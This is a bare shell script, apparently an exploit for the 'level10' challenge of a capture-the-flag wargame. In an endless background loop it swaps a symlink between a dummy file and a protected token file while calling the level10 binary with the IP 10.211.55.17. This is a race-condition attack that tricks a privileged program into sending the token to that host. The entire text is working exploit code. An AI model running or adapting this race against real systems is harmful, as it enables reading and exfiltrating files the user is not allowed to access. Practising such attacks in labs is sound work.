#!/bin/sh
        touch myfile
        while true; do
                ln -sf ./myfile a &
                ./level10 a 10.211.55.17 &
                ln -sf /home/user/level10/token a &
        done
